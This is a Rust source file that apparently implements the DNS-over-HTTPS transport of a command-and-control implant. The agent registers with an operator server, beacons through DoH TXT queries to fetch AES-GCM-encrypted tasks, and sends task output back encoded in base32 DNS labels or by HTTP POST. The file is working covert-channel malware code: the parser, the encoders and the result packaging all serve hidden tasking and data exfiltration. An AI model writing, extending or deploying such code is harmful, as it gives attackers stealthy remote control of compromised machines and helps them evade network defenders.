//! DNS-over-HTTPS transport.
//!
//! Registration delegates to HTTP POST /register (sets agent_id + aes_key).
//! Beacon:  GET /dns-query?name=b.<dohEncode(agentID)>&type=TXT
//!          → DNS wireformat → base64(AES-GCM(tasks_json))
//! Result small (≤3000 bytes): GET /dns-query?name=r.<dohEncode(json)>&type=TXT
//! Result large (>3000 bytes): POST /result/<agentID>

use base64::{engine::general_purpose::STANDARD, Engine as _};
use crate::crypto;

const DOH_CHUNK: usize = 63;
const DOH_MAX_RESULT: usize = 3000;

// ── Base32 (RFC 4648, no padding, uppercase for DoH labels) ──────────────────

const B32U: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

fn b32_encode_upper(data: &[u8]) -> String {
    let mut out = Vec::new();
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    for &b in data {
        buf = (buf << 8) | b as u64;
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            out.push(B32U[((buf >> bits) & 0x1f) as usize]);
        }
    }
    if bits > 0 {
        out.push(B32U[((buf << (5 - bits)) & 0x1f) as usize]);
    }
    String::from_utf8(out).unwrap_or_default()
}

/// Encode bytes as base32 and split into 63-char labels joined by dots.
pub fn doh_encode(data: &[u8]) -> String {
    let encoded = b32_encode_upper(data);
    let mut labels = Vec::new();
    let mut i = 0;
    while i < encoded.len() {
        let end = (i + DOH_CHUNK).min(encoded.len());
        labels.push(&encoded[i..end]);
        i = end;
    }
    labels.join(".")
}

/// Percent-encode a string for use in a URL query parameter.
/// Only encodes characters not safe in query values.
pub fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for c in s.chars() {
        match c {
            'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '~' => out.push(c),
            '.' => out.push_str("%2E"),
            _ => {
                let mut buf = [0u8; 4];
                let enc = c.encode_utf8(&mut buf);
                for b in enc.bytes() {
                    out.push('%');
                    out.push(char::from_digit((b >> 4) as u32, 16).unwrap_or('0').to_ascii_uppercase());
                    out.push(char::from_digit((b & 0xf) as u32, 16).unwrap_or('0').to_ascii_uppercase());
                }
            }
        }
    }
    out
}

// ── DNS wire TXT parser ───────────────────────────────────────────────────────

pub fn parse_doh_txt(data: &[u8]) -> Vec<u8> {
    if data.len() < 12 { return Vec::new(); }
    let ancount = (data[6] as usize) << 8 | data[7] as usize;
    let qdcount = (data[4] as usize) << 8 | data[5] as usize;
    if ancount == 0 { return Vec::new(); }
    let mut pos = 12;
    for _ in 0..qdcount {
        while pos < data.len() {
            if data[pos] == 0 { pos += 1; break; }
            if data[pos] & 0xC0 == 0xC0 { pos += 2; break; }
            pos += data[pos] as usize + 1;
        }
        if pos + 4 <= data.len() { pos += 4; }
    }
    for _ in 0..ancount {
        if pos >= data.len() { break; }
        if data[pos] & 0xC0 == 0xC0 {
            pos += 2;
        } else {
            while pos < data.len() {
                if data[pos] == 0 { pos += 1; break; }
                pos += data[pos] as usize + 1;
            }
        }
        if pos + 10 > data.len() { break; }
        let rtype = (data[pos] as usize) << 8 | data[pos+1] as usize;
        pos += 2; pos += 2; pos += 4;
        let rdlen = (data[pos] as usize) << 8 | data[pos+1] as usize;
        pos += 2;
        if rdlen == 0 || pos + rdlen > data.len() { break; }
        let rdata = &data[pos..pos+rdlen];
        pos += rdlen;
        if rtype == 16 {
            let mut txt = Vec::new();
            let mut rp = 0;
            while rp < rdata.len() {
                let sl = rdata[rp] as usize; rp += 1;
                if rp + sl > rdata.len() { break; }
                txt.extend_from_slice(&rdata[rp..rp+sl]);
                rp += sl;
            }
            if !txt.is_empty() { return txt; }
        }
    }
    Vec::new()
}

// ── DoH beacon/result operations (called from transport.rs) ──────────────────

/// Decrypt a DoH beacon response.
/// raw_txt = DNS wireformat TXT bytes → base64(AES-GCM(tasks_json)).
pub fn decrypt_beacon(raw_txt: &[u8], aes_key: &[u8]) -> Option<Vec<u8>> {
    if raw_txt.is_empty() { return None; }
    let b64_str = String::from_utf8_lossy(raw_txt);
    let ciphertext = STANDARD.decode(b64_str.trim()).ok()?;
    crypto::open(aes_key, &ciphertext)
}

/// Build the result payload JSON and encrypt with AES-GCM.
pub fn make_result_ciphertext(aes_key: &[u8], task_id: i64, output: &str, error: &str) -> Vec<u8> {
    let plain = serde_json::json!({
        "task_id":  task_id,
        "output":   output,
        "error":    error,
        "is_admin": false,
    }).to_string();
    crypto::seal(aes_key, plain.as_bytes())
}

/// Is the ciphertext small enough for URL encoding?
pub fn is_small_result(ct: &[u8]) -> bool {
    ct.len() <= DOH_MAX_RESULT
}

/// Build the DoH query name for a small result submission.
pub fn make_result_query_name(agent_id: &str, ciphertext: &[u8]) -> String {
    let payload = serde_json::json!({
        "a": agent_id,
        "d": STANDARD.encode(ciphertext),
    }).to_string();
    format!("r.{}", doh_encode(payload.as_bytes()))
}
